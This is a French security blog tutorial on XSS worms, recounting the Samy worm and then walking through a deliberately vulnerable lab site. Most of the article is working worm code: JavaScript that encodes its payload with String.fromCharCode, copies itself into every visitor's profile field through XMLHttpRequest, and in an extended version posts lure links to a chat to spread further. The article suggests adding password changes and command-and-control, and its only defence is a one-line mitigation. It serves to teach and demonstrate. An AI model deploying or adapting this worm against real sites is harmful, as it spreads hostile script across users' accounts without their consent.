@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="fr">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="description" content="L&#39;apparition des premiers vers informatiques date de 1988 avec la création du ver Morris. Celui-ci n&#39;était pas destructeur mais à néanmoins engendré un coup estimé à 100 millions de dollars suite...">
+        <meta name="keywords" content="Etude de cas, Tutoriel, XSS">
+        <link rel="icon" href="https://www.dailysecurity.fr/favicon.png">
+        <title>Les Vers XSS: Game of Life - Daily Security</title>
+
+        <!-- Stylesheets -->
+        <link href="https://www.dailysecurity.fr/theme/css/all.min.css" rel="stylesheet">
+        <!-- /Stylesheets -->
+
+        <!-- RSS Feeds -->
+        <link href="https://www.dailysecurity.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Daily Security Full Atom Feed" />
+        <link href="https://www.dailysecurity.fr/category/journal-de-geluchat/feed/index.xhtml" type="application/atom+xml" rel="alternate" title="Daily Security Categories Atom Feed" />
+        <!-- /RSS Feeds -->
+
+        <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+
+
+    </head>
+
+    <body>
+
+        <!-- Header -->
+    <div class="header-container" style="background: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)), url('https://www.dailysecurity.fr/images/fond.png'); background-position: center; background-size: cover;">
+
+            <!-- Static navbar -->
+            <div class="container">
+                <div class="header-nav">
+                    <div class="header-logo">
+ 
+                       <a class="pull-left" href="https://www.dailysecurity.fr/" style="outline : none;"><img class="mr20 hidden-xs" src="https://www.dailysecurity.fr/images/logo.png" height="57" width="312" alt="logo"></a>
+                    </div>
+                    <div class="nav pull-right">
+                                <a href="https://www.dailysecurity.fr/">Accueil</a>
+                                <a href="https://www.dailysecurity.fr/categories.html">Catégories</a>
+                            <a  href="https://www.dailysecurity.fr/presentation">À propos</a>
+                    </div>
+                </div>
+            </div>
+            <!-- /Static navbar -->
+
+            <!-- Header -->
+    <!-- Header -->
+    <div class="container header-wrapper">
+        <div class="row">
+              <div class="col-lg-12">
+                  <div class="header-content">
+                      <h1 class="header-title">Les Vers XSS: Game of Life</h1>
+                      <p class="header-date">Par <a href="https://www.dailysecurity.fr/author/geluchat.html">Geluchat</a>, mar. 10 mars 2015, dans la catégorie <a href="https://www.dailysecurity.fr/category/journal-de-geluchat.html">Journal de geluchat</a></p>
+                      <div class="header-underline"></div>
+                      <div class="clearfix"></div>
+                      <p class="pull-right header-tags">
+                          <span class="glyphicon glyphicon-tags mr5" aria-hidden="true"></span>
+<a href="https://www.dailysecurity.fr/tag/etude-de-cas.html">Etude de cas</a>, <a href="https://www.dailysecurity.fr/tag/tutoriel.html">Tutoriel</a>, <a href="https://www.dailysecurity.fr/tag/xss.html">XSS</a>                      </p>
+                  </div>
+              </div>
+        </div>
+    </div>
+    <!-- /Header -->
+            <!-- /Header -->
+
+        </div>
+        <!-- /Header -->
+
+
+        <!-- Content -->
+    <div class="container content">
+        <p>L'apparition des premiers vers informatiques date de 1988 avec la création du ver Morris.</p>
+<p>Celui-ci n'était pas destructeur mais à néanmoins engendré un coup estimé à 100 millions de dollars suite à plusieurs erreurs de conceptions.</p>
+<p>En ce qui concerne notre sujet principal, à savoir les Vers XSS, leur arrivée a été plus tardive.</p>
+<p>Le plus connu d'entre eux est sans aucun doute le ver Samy qui a infecté le réseau MySpace en 2005.</p>
+<p>Je vous conseille d'ailleurs de lire <a href="https://samy.pl/popular/">l'histoire</a> du créateur de ce ver qui a mis à disposition <a href="https://samy.pl/popular/tech.html">son code</a> ainsi que ses réactions heure par heure pendant le déploiement de son ver.</p>
+<p>Une fois de plus, ce ver n’était pas nocif et se contentait simplement de poster un message sur le profil de la personne ("But most of all, samy is my hero") ainsi que de l'ajouter en ami.</p>
+<p>Après cette petite introduction, passons à un exemple.</p>
+<p>Pour commencer, j'ai créé un site faillible permettant de tester les <strong>vers XSS</strong>, il est composé de quatre parties :</p>
+<ul>
+<li>Connexion au site</li>
+<li>Un tchat en ligne</li>
+<li>L'affichage du profil</li>
+<li>L'affichage des profils des autres comptes</li>
+</ul>
+<p>Il est disponible <a href="https://github.com/Geluchat/Vulnerable/tree/master/Vers%20XSS">ici</a>.</p>
+<p>Pour le configurer, rien de plus simple :</p>
+<ul>
+<li>Créer une base de données "Ver"</li>
+<li>Importer le fichier bdd.sql</li>
+<li>Mettre les bons identifiants dans le fichier bdd.php</li>
+</ul>
+<p>Voilà, vous êtes prêts pour la suite de cet article !</p>
+<p>Si vous avez survolé le site, vous aurez sans doute remarqué que le profil contient une option "humeur".</p>
+<p>Cette humeur correspond à une sorte de "message d'état", un petit mot que la personne peut laisser sur son profil.</p>
+<p>Le champ <em>humeur</em> ainsi que le tchat sont tous deux faillibles au XSS.</p>
+<p>Pour notre exemple nous allons passer par le champ "humeur"; cela nous permettra de laisser cours à notre imagination lors de la dernière partie de cet article.</p>
+<p>Procédons, maintenant au schéma d'attaque :</p>
+<ul>
+<li>Nous allons nous connecter en tant que Alice puis infecter notre profil.</li>
+<li>Ensuite nous nous connecterons en tant que Admin puis visiterons le profil d'Alice.</li>
+<li>Enfin nous vérifierons que nous avons bel et bien été infecté à notre tour.</li>
+</ul>
+<p>Sans tarder, voici le code du ver que nous allons utiliser :</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/Ver/profile.php&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">post</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">104</span><span class="p">,</span><span class="mf">117</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">117</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">73</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">102</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">60</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">32</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">34</span><span class="p">,</span><span class="mf">111</span><span class="p">,</span><span class="mf">119</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">34</span><span class="p">,</span><span class="mf">62</span><span class="p">);</span>
+<span class="nx">post</span><span class="o">=</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;owned&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">);</span>
+<span class="nx">post</span><span class="o">=</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">60</span><span class="p">,</span><span class="mf">47</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">62</span><span class="p">)));</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-length&quot;</span><span class="p">,</span> <span class="nx">post</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Connection&quot;</span><span class="p">,</span> <span class="s2">&quot;close&quot;</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">post</span><span class="p">);</span>
+
+<span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Infected&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>Une petite explication s'impose.</p>
+<p>On ouvre une requête HTTP :</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/Ver/profile.php&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>La ligne suivante correspond à  <code>humeur=Infected&lt;script id="owned"&gt;</code> :</p>
+<p><em>ps : Elle est encodée car le Javascript est très pointilleux avec ses mots clés.</em></p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">post</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">104</span><span class="p">,</span><span class="mf">117</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">117</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">73</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">102</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">60</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">32</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">34</span><span class="p">,</span><span class="mf">111</span><span class="p">,</span><span class="mf">119</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">34</span><span class="p">,</span><span class="mf">62</span><span class="p">);</span>
+</code></pre></div>
+
+<p>Passons ensuite à la ligne la plus importante, elle récupère le code du ver grâce à l'id que nous avons défini à l'aide de la première instruction :</p>
+<div class="highlight"><pre><span></span><code><span class="nx">post</span><span class="o">=</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;owned&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">);</span>
+</code></pre></div>
+
+<p>On ferme ensuite la balise script :</p>
+<div class="highlight"><pre><span></span><code><span class="nx">post</span><span class="o">=</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">60</span><span class="p">,</span><span class="mf">47</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">62</span><span class="p">)));</span>
+</code></pre></div>
+
+<p>Enfin, on envoie le ver sur le profil personnel de la personne et on affiche un pop-up qui signale l'infection :</p>
+<div class="highlight"><pre><span></span><code><span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-length&quot;</span><span class="p">,</span> <span class="nx">post</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Connection&quot;</span><span class="p">,</span> <span class="s2">&quot;close&quot;</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">post</span><span class="p">);</span>
+
+<span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Infected&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>Ce qui donne en action :</p>
+<p><img src="https://www.dailysecurity.fr/images/Alice-before.png" alt="Alice-before" style="width: 50%;"></p>
+<hr>
+<p>On change l'humeur par le script :</p>
+<hr>
+<p><img alt="Alice-After" src="https://www.dailysecurity.fr/images/Alice-After.png"></p>
+<hr>
+<p>Puis, on se connecte en Admin :</p>
+<hr>
+<p><img src="https://www.dailysecurity.fr/images/Admin-Before.png" alt="Admin-before" style="width: 50%;"></p>
+<hr>
+<p>Et enfin, on accède à <code>affiche.php?id=2</code>, l'id 2 étant l'id d'Alice :</p>
+<hr>
+<p><img alt="Admin-After" src="https://www.dailysecurity.fr/images/Admin-After.png"></p>
+<hr>
+<p>On constate que l'utilisateur Admin a bien été infecté en consultant le profil d’Alice !</p>
+<p><img src="https://dailysecurity.fr/images/ohyes.gif" alt="Oh Yes" style="width: 35%;"></p>
+<p>Pour aller plus loin, on peut s'amuser à rajouter une fonction qui envoie un message dans le tchat avec le lien du profil à chaque infection.</p>
+<p>Afin de rendre l'exercice plus amusant, nous allons utiliser une sélection aléatoire de la chaine à envoyer dans le tchat :</p>
+<div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">http</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/Ver/profile.php&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">post</span><span class="o">=</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">104</span><span class="p">,</span><span class="mf">117</span><span class="p">,</span><span class="mf">109</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">117</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">73</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">102</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">60</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">32</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">61</span><span class="p">,</span><span class="mf">34</span><span class="p">,</span><span class="mf">111</span><span class="p">,</span><span class="mf">119</span><span class="p">,</span><span class="mf">110</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">100</span><span class="p">,</span><span class="mf">34</span><span class="p">,</span><span class="mf">62</span><span class="p">);</span>
+<span class="nx">post</span><span class="o">=</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;owned&quot;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">);</span>
+<span class="nx">post</span><span class="o">=</span><span class="nb">encodeURI</span><span class="p">(</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">60</span><span class="p">,</span><span class="mf">47</span><span class="p">,</span><span class="mf">115</span><span class="p">,</span><span class="mf">99</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">105</span><span class="p">,</span><span class="mf">112</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">62</span><span class="p">)));</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-length&quot;</span><span class="p">,</span> <span class="nx">post</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Connection&quot;</span><span class="p">,</span> <span class="s2">&quot;close&quot;</span><span class="p">);</span>
+<span class="nx">http</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">post</span><span class="p">);</span>
+
+
+<span class="nx">randomstring</span><span class="o">=</span><span class="p">[</span><span class="s2">&quot;[PDF] Pirater comme un nul&quot;</span><span class="p">,</span> <span class="s2">&quot;[Tuto] BruteForce Facebook&quot;</span><span class="p">,</span> <span class="s2">&quot;[TUTO] Hack Hotmail&quot;</span><span class="p">,</span> <span class="s2">&quot;[INFO] Aller sur le deepweb&quot;</span><span class="p">];</span>
+<span class="nx">post</span><span class="o">=</span><span class="s2">&quot;message=&lt;a href=%22./affiche.php?id=1%22&gt;&quot;</span><span class="p">;</span>
+<span class="nx">post</span><span class="o">=</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="nx">randomstring</span><span class="p">[</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">randomstring</span><span class="p">.</span><span class="nx">length</span><span class="p">)]);</span>
+<span class="nx">post</span><span class="o">=</span><span class="nx">post</span><span class="p">.</span><span class="nx">concat</span><span class="p">(</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">);</span>
+
+<span class="kd">var</span> <span class="nx">http2</span> <span class="o">=</span> <span class="ow">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+<span class="nx">http2</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;/Ver/shout.php&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nx">http2</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s2">&quot;Content-type&quot;</span><span class="p">,</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">);</span>
+<span class="nx">http2</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">post</span><span class="p">);</span>
+
+<span class="nx">alert</span><span class="p">(</span><span class="s2">&quot;Infected&quot;</span><span class="p">);</span>
+</code></pre></div>
+
+<p>Vous savez maintenant créer votre propre ver XSS ainsi que le modifier pour lui ajouter des fonctions.</p>
+<p>Ces fonctions peuvent être diverses et ne sont limitées que par votre imagination (Changement de mot de passe, Command and Control, Bypass Token, etc.).</p>
+<p>Pour empêcher les Vers XSS sur votre site, il suffit tout simplement de le sécuriser des XSS Classiques (grâce à la fonction html_entities()).</p>
+<p>Voilà, c’est déjà terminé, n’hésitez pas à rejoindre mon <a href="https://twitter.com/Geluchat">Twitter</a> pour avoir des news sur le site et mon point de vue sur l’actualité de la sécurité informatique.</p>
+<p>Geluchat.</p>
+
+
+    <div class="comments">
+        <div id="disqus_thread"></div>
+            <script type="text/javascript">
+                var disqus_shortname = 'dailysecurity-fr';
+                var disqus_identifier = 'les-vers-xss';
+                var disqus_url = 'https://www.dailysecurity.fr/les-vers-xss';
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            </script>
+        <noscript>Please enable JavaScript to view the comments.</noscript>
+    </div>
+        
+    </div>
+        <!-- /Content -->
+
+        <!-- Footer -->
+        <div class="footer gradient-2">
+            <div class="container footer-container ">
+                <div class="row">
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Sitemap</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://www.dailysecurity.fr/archives.html">Archives</a></li>
+                            <li><a href="https://www.dailysecurity.fr/categories.html">Catégories</a></li>
+                            <li><a href="https://www.dailysecurity.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">Flux RSS</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Social</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://twitter.com/Geluchat" target="_blank">Twitter</a></li>
+                            <li><a href="https://github.com/Geluchat" target="_blank">GitHub</a></li>
+                            <li><a href="https://www.linkedin.com/in/baptiste-devigne/" target="_blank">Linkedin</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-4 col-sm-3 col-md-3 col-lg-3">
+                        <div class="footer-title">Les blogs des amis</div>
+                        <ul class="list-unstyled">
+                            <li><a href="https://proofofcalc.com/" target="_blank">Proof of Calc</a></li>
+                            <li><a href="http://beta.hackndo.com" target="_blank">Blog de Pixis</a></li>
+                        </ul>
+                    </div>
+                    <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3">
+                        <p class="pull-right text-right">
+                            <small><em>Powered by <a href="http://docs.getpelican.com/" target="_blank">pelican</a></em></small><br/>
+                            <small><em>Theme <a href="https://github.com/molivier" target="_blank">molivier</a></em></small><br/>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- /Footer -->
+        <!-- Google Analytics -->
+        <script>
+          (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+          (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+          })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+          ga('create', 'UA-97100797-1', 'auto');
+          ga('send', 'pageview');
+        </script>
+        <!-- /Google Analytics -->
+     </body>
+</html>
